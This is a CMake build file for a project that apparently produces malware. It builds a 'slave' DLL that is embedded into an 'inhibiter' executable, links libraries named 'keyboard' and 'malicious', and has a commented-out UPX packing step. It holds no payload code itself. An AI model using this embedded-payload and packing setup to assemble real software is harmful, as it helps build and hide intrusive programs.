set(SLAVE_DLL_TARGET "slave_dll")

file(GLOB_RECURSE slave_dll_source_files dll/*)
add_library(${SLAVE_DLL_TARGET} SHARED ${slave_dll_source_files})
set_target_properties(${SLAVE_DLL_TARGET} PROPERTIES COMPILE_FLAGS ${BUILD_FLAGS_MT} COMPILE_DEFINITIONS PROJECT_MODULE="${SLAVE_DLL_TARGET}")
target_link_libraries(${SLAVE_DLL_TARGET} system keyboard network blaspheme malicious log userenv)

add_custom_command(
	TARGET ${SLAVE_DLL_TARGET}
	POST_BUILD
	COMMAND "${BINGENERATOR}" "${SLAVE_DLL_PATH}" "${SLAVE_DLL_HPP_PATH}" "SlaveDll"
	COMMENT "Generating ${SLAVE_DLL_HPP_PATH} WITH ${SLAVE_DLL_PATH}"
)

set(INHIBITER_TARGET "inhibiter")

file(GLOB_RECURSE inhibiter_source_files inhibiter/*)
add_executable(${INHIBITER_TARGET} ${GUI_TYPE} ${inhibiter_source_files})
set_target_properties(${INHIBITER_TARGET} PROPERTIES COMPILE_FLAGS ${BUILD_FLAGS_MT} COMPILE_DEFINITIONS PROJECT_MODULE="${INHIBITER_TARGET}")

# substrate has to be built before inhibiter, because of resource inclusion
target_link_libraries(${INHIBITER_TARGET} log malicious system network slave_dll shlwapi)
# install(TARGETS ${INHIBITER_TARGET} RUNTIME DESTINATION innocence)

# UPX Compression
#if ( CMAKE_BUILD_TYPE MATCHES Debug)
#	message(STATUS "Compressing disabled")
#elseif( CMAKE_BUILD_TYPE MATCHES Release)
#	if(WIN32)
#		message(STATUS "Compression activee sur ${BINARY_OUTPUT}/inhibitor.exe WITH ${COMPRESSOR}")
#		add_custom_command(
#			TARGET inhibitor
#			POST_BUILD
#			COMMAND "C:/innocence/compress.bat"
#			COMMENT "Compressing ${BINARY_OUTPUT}/inhibitor.exe WITH ${COMPRESSOR}"
#		)
#	endif()
#endif ()
